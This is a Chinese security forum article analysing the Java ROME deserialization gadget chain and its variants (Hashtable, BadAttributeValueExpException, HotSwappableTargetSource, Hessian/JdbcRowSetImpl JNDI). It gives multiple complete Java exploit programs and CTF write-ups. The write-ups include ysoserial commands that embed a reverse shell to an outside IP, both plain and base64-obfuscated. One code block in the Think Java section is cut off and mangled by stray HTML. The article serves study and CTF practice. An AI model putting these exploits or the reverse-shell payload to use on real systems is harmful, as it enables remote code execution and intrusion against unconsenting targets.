# Java安全 - ROME链

> **来源**: https://forum.butian.net/share/2865  
> **文章ID**: 2865

---

ROME链
=====

‍

emm说实话这个ROME链其实可以理解为fastjson的触发 就是调用任意的getter方法，那么fastjson的打法基本上可以直接抄过来了

简介
--

ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。

‍

依赖
--

```xml

            rome
            rome
            1.0

```

‍

利用链分析
-----

```yaml
HashMap#readObject -> ObjectBean#hashCode() -> ToStringBean#toString(String) -> TemplatesImpl.getOutputProperties()
```

‍

‍

### ObjectBean

​`com.sun.syndication.feed.impl.ObjectBean`​ 是 Rome 提供的一个封装类，初始化时提供了一个 Class 类型和一个 Object 对象实例进行封装

ObjectBean 有三个成员变量，分别是 EqualsBean/ToStringBean/CloneableBean 类，这三个类为 ObjectBean 提供了 `equals`​、`toString`​、`clone`​ 以及 `hashCode`​ 方法。

​![image](images/attach-e9c1e5ae545ec00b00c46f0efbdd30f16bbe7ae3.png)​

‍

来看一下 ObjectBean 的 `hashCode`​ 方法，会调用 EqualsBean 的 `beanHashCode`​ 方法

‍

​![image](images/attach-bd9115c6ee90e2495eafe01ab961abef58d7ad37.png)​

‍

调用 EqualsBean 中保存的 `_obj`​ 的 `toString()`​ 方法

​![image](images/attach-79fa93fba3202c5f6fd9dba3abf7f1e326c6d0e1.png)​

‍

而这个 `toString()`​ 方法也就是触发利用链的地方，继 BadAttributeValueExpException 之后的另一个使用 `toString()`​ 方法触发利用的链。

‍

### ToStringBean

​`com.sun.syndication.feed.impl.ToStringBean`​ 类从名字可以看出，这个类给对象提供 toString 方法，类中有两个 toString 方法，第一个是无参的方法。获取调用链中上一个类或 `_obj`​ 属性中保存对象的类名，并调用第二个 toString 方法。

​![image](images/attach-d1091fb11e30c2533eb7c3ff9e4083a50b3b9f06.png)​

‍

然后这个有参方法会调用 `BeanIntrospector.getPropertyDescriptors()`​ 来获取 `_beanClass`​ 的全部 getter/setter 方法，然后判断参数长度为 0 的方法使用 `_obj`​ 实例进行反射调用，翻译成人话就是会调用所有 getter 方法拿到全部属性值，然后打印出来。

​![image](images/attach-9458670d536b737b61ad5ea850cfc0ff16d9cbfa.png)​

由此可见，ToStringBean 的 `toString()`​ 方法可以触发其中 `_obj`​ 实例的全部 getter 方法，可以用来触发 TemplatesImpl 的利用链。

‍

‍

EXP

```java
package ROME;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class Rome {

    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {

        // 生成包含恶意类字节码的 TemplatesImpl 类
        byte[] payloads = Files.readAllBytes(Paths.get("D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"));

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] {payloads});
        setFieldValue(templates, "_name", "zjacky");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化
        ObjectBean delegate = new ObjectBean(Templates.class, templates);

        // 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString
        // 先封装一个无害的类
        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "zjacky"));

        // 放入 Map 中
        HashMap map = new HashMap<>();
        map.put(root, "zjacky");
        map.put("1", "1");

        // put 到 map 之后再反射写进去，避免触发漏洞
        Field field = ObjectBean.class.getDeclaredField("_equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));

//        serialize(map);
        unserialize("ser.bin");
    }

}

```

​![image](images/attach-54bda3240a6d0c9b7d5c9083ac54bb07092701cc.png)​

其他利用链
-----

这个链子其实非常简单，所以会有很多排列组合，只需要反序列化入口能够出发hashcode()方法或者最终触发到ToStringBean方法的tostring就行

‍

利用链

```java
HashMap#ReadObject() -> EqualsBean#hashCode() -> ToStringBean#toString(String) -> TemplatesImpl.getOutputProperties()
```

‍

### ​`EqualsBean.class#hashcode`​​

相当于跳过了一步吧，感觉没啥用只能说是一种变形

```java
package ROME;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class ROME_ObjectBean_hashCode {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        byte[] payloads = Files.readAllBytes(Paths.get("D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"));

        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {payloads});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);

        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);

        HashMap hashMap = new HashMap<>();
        hashMap.put(objectBean, "123");

//        serialize(hashMap);
        unserialize("ser.bin");
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}

```

‍

### ​`HashTable#readobject()`​​

HashTable利用链其实并不是针对ROME的利用链。其作用是能够类似hashmap一样调用任意类的hashcode方法

利用链

```java
HashTable#ReadObject() -> ObjectBean#hashCode() -> ToStringBean#toString(String) -> TemplatesImpl.getOutputProperties()
```

‍

#### 利用链分析

先断到`HashTable#reconstitutionPut()`​

​![image](images/attach-2e04f189de9d8c163167a54894af0575acc018eb.png)​

可以发现也是直接调用`key`​的`hashcode`​方法

​![image](images/attach-c50f6a2c9a7856f349a40f387ba759e74d07d71d.png)​

​​

‍

```java
package ROME;

import Serial.Serial;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Hashtable;

public class ROME_HashTable {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class"));

        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);

        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);

        Hashtable hashtable = new Hashtable();
        hashtable.put(objectBean,"123");

        Serial.Serialize(hashtable);
        Serial.DeSerialize("ser.bin");
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

‍

‍

### BadAttributeValueExpException利用链

‍

利用链

```java
BadAttributeValueExpException#readObject() -> ToStringBean.toString(String) -> TemplatesImpl.getOutputProperties()
```

‍

```java
package ROME;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ROME_BadAttributeValueExpException {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        byte[] payloads = Files.readAllBytes(Paths.get("D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"));

        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {payloads});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);

        setValue(badAttributeValueExpException,"val",toStringBean);

        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
```

‍

‍

### HotSwappableTargetSource利用链

这条是spring原生的toString利用链，调用链如下

‍

利用链

```java
HashMap#readObject() -> HashMap#putVal -> HotSwappableTargetSource#equals -> XString.equals -> ToStringBean.toString -> TemplatesImpl.getOutputProperties()
```

‍

#### 利用链分析

‍

在`/Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/src.zip!/com/sun/org/apache/xpath/internal/objects/XString.java`​ 类下找到 equals方法可以调用`toString`​方法

​![image](images/attach-e53460a3aca74ad974a440a72c6a415ae9324f9e.png)​

往上跟进找到

​`spring-aop-5.0.14.RELEASE.jar!/org/springframework/aop/target/HotSwappableTargetSource.java#equals()`​

​![image](images/attach-76c9905726e6fe89b49734668848994bf1428c45.png)​

由于是equals()就想到了Hashmap这条，于是就跟完了

EXP

```java
package ROME;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class ROME_HotSwappableTargetSource {

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void setValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        byte[] payloads = Files.readAllBytes(Paths.get("/Users/zjacky/Documents/Security-Testing/Java-Sec/Java-Sec-Payload/target/classes/Evail_Class/Calc.class"));

        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {payloads});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templatesimpl);

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap hashMap = new HashMap<>();
        hashMap.put(h1,h1);
        hashMap.put(h2,h2);

        //serialize(hashMap);
        unserialize("ser.bin");
    }

}

```

​![image](images/attach-f717446f34da57616d04a47ab4df5d861c7eff77.png)​

‍

### JdbcRowSetImpl利用链

‍

既然Rome可以任意触发getter方法，那必然想到Fastjson中的JdbcRowSetImpl的JNDI

‍

#### 利用链分析

‍

利用链

```java
Hessian#readObject() -> HashMap#put()-> ObjectBean#hashCode() -> ToStringBean#toString(String) -> JdbcRowSetImpl#getDatabaseMetaData()
```

‍

问题出在`JdbcRowSetImpl#getDatabaseMetaData()`​

​![image](images/attach-0ad5fcc868e319794dc8e85c6d1b73a6074d6d2c.png)​

‍

调用`this.connect();`​ 方法 跟进一下

‍

​![image](images/attach-42bc8fc47bbafbfbb92f0cf69d05771343461a84.png)​

这个的话很明显的一个lookup函数配合JNDI

```java
InitialContext var1 = new InitialContext();
DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
```

‍

另一个函数就是`setDataSourceName`​去设置下我们JNDI查询的地址即可

​![image](images/attach-31daa3485fffdae5ede4fbd371c75adb3adb28d4.png)​

‍

他会调用父类的`setDataSourceName`​然后去设置`dataSource`​参数

​![image](images/attach-39a88dfedeb49409c2777c18be23c72e725eab3c.png)​

而lookup函数的参数其实就是datasource这个参数

​![image](images/attach-c279a05ff57288fb7fede7ed7be3270cb679d30a.png)​

‍

EXP

```java
package Hessian;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Hessian_JNDI implements Serializable {

    public static  byte[] serialize(T o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        HessianOutput output = new HessianOutput(bao);
        output.writeObject(o);
        System.out.println(bao.toString());
        return bao.toByteArray();
    }

    public static  T deserialize(byte[] bytes) throws IOException {
        ByteArrayInputStream bai = new ByteArrayInputStream(bytes);
        HessianInput input = new HessianInput(bai);
        Object o = input.readObject();
        return (T) o;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getValue(Object obj, String name) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://127.0.0.1:1389/1re2as";
        jdbcRowSet.setDataSourceName(url);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        //手动生成HashMap，防止提前调用hashcode()
        HashMap hashMap = makeMap(equalsBean,"1");

        byte[] s = serialize(hashMap);
        System.out.println(s);
        System.out.println((HashMap)deserialize(s));
    }

    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap s = new HashMap<>();
        setValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setValue(s, "table", tbl);
        return s;
    }
}

```

​![image](images/attach-49900e473a1159c8bbb2ac657ef47c0c2d635223.png)​

‍

例题分析
----

### \[网鼎杯 2020 朱雀组\]Think Java

先给了 4 个 class

```java
// Test.class
package cn.abc.core.controller;

import cn.abc.common.bean.ResponseCode;
import cn.abc.common.bean.ResponseResult;
import cn.abc.common.security.annotation.Access;
import cn.abc.core.sqldict.SqlDict;
import cn.abc.core.sqldict.Table;
import io.swagger.annotations.ApiOperation;
import java.io.IOException;
import java.util.List;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@CrossOrigin
@RestController
@RequestMapping({"/common/test"})
public class Test {
    @PostMapping({"/sqlDict"})
    @Access
    @ApiOperation("\u4e3a\u4e86\u5f00\u53d1\u65b9\u4fbf\u5bf9\u5e94\u6570\u636e\u5e93\u5b57\u5178\u67e5\u8be2")
    public ResponseResult sqlDict(String dbName) throws IOException {
        List<span style="font-weight:bold;">Spring 中有 Rome 环境，使用 Rome 链</span>

```bash
java -jar ysoserial.jar ROME "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQ3LjEwOC4yMDkuNi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > 1.bin
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME "bash -i >&/dev/tcp/47.108.209.6/4444 0>&1" | base64 -w 0
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  ROME "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQ3LjEwOC4yMDkuN i80NDQ0IDA+JjE=|{base64,-d}|{bash,-i}" | base64 -w 0 > 1.bin
```

‍

‍

### NewStarCTF \[Rome\]

​![image](images/attach-4672a32f00017d85d08ec4a46e3d5a635c322d41.png)​

base64解码直接反序列化，看看依赖有ROME也有jackson

‍

#### jackson

​![image](images/attach-64cbf259e27cb02d5ccf9834b83a8cc13b48e58a.png)​

符合漏洞版本直接打jackson反序列化就行

​![image](images/attach-a41891f460634c0b05dd1ae6ad2cef21d44ae04f.png)​

‍

​![image](images/attach-3846817d6d80105073b4833de8b7c8a5091879e5.png)​

​![image](images/attach-75e31fcd6f854558d27132b5b8a92d45eb6a06d5.png)​

‍

#### rome

直接打rome链即可

```java
package ROME;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class Rome {

    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {

        // 生成包含恶意类字节码的 TemplatesImpl 类
        byte[] payloads = Files.readAllBytes(Paths.get("D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class"));

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] {payloads});
        setFieldValue(templates, "_name", "zjacky");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化
        ObjectBean delegate = new ObjectBean(Templates.class, templates);

        // 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString
        // 先封装一个无害的类
        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "zjacky"));

        // 放入 Map 中
        HashMap map = new HashMap<>();
        map.put(root, "zjacky");
        map.put("1", "1");

        // put 到 map 之后再反射写进去，避免触发漏洞
        Field field = ObjectBean.class.getDeclaredField("_equalsBean");
        field.setAccessible(true);
        field.set(root, new EqualsBean(ObjectBean.class, delegate));

        serialize(map);
//        unserialize("ser.bin");
    }

}

```

base64传入即可

‍

工具

```bash
java -jar y4-yso.jar ROME "calc" | base64 -w 0 > 1.txt
```

‍

​![image](images/attach-e8ce63bb94f2c26f84ac37b7891cd031d7955b6f.png)​

‍

‍
